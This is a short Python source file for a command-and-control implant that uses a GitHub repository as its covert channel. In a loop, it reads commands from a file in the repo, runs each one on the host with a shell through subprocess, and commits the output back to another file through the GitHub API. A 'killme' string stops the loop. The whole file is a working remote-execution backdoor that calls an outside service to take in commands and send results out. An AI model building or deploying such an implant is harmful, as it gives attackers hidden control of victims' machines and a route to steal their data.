from github import Github
import base64
import subprocess

class ghubc2:
    def __init__(self,access_token,repo_id,branch):
        # Authenticate with a GitHub personal access token (classic or fine-grained)
        g = Github(access_token)
        self.repo = g.get_repo(repo_id)  # Your fork
        self.branch=branch
        self.killing=True
        self.oldcommand = ""
    def send(self,file_path,new_content):
        # # Authenticate with a GitHub personal access token (classic or fine-grained)
        # g = Github(self.access_token) 
        # repo = g.get_repo(self.repo_id)  # Your fork

        # file_path = "scripts/autocalib.sh"
        file = self.repo.get_contents(file_path)

        # new_content = "#!/bin/bash\necho 'Updated by Python script!'"

        # Update the file
        self.repo.update_file(
            path=file_path,
            message="Update resver.sh via script",
            content=new_content,
            sha=file.sha,
            branch=self.branch
        )

        # print("File updated successfully.")

    def resave(self,file_path):
        # g = Github(self.access_token)
        # repo = g.get_repo(self.repo_id)

        # Get file content
        file_content = self.repo.get_contents(file_path, ref=self.branch)
        command = file_content.decoded_content.decode()
        command = command.replace("\n","").replace(" ","") 
        output = subprocess.run(command, shell=True, capture_output=True, text=True).stdout
        file_path = "resver.txt"
        if command == "killme":
            self.killing = False
        elif self.oldcommand == command:
            # self.killing = False
            pass
        else:
            self.oldcommand = command
            self.send(file_path,output)
        # print(command)
if __name__ == '__main__':
    access_token = "YOUR_ACCESS_TOKEN"
    repo_id = "shiky8/ghubc2_testing"
    branch = "main"
    hub = ghubc2(access_token,repo_id,branch)
    # file_path = "resver.txt"
    # new_content = "tesing id3"
    # hub.send(file_path,new_content)
    file_path = "sender.txt"
    # print(hub.oldcommand)
    while hub.killing:
        hub.resave(file_path)
        # print(hub.oldcommand)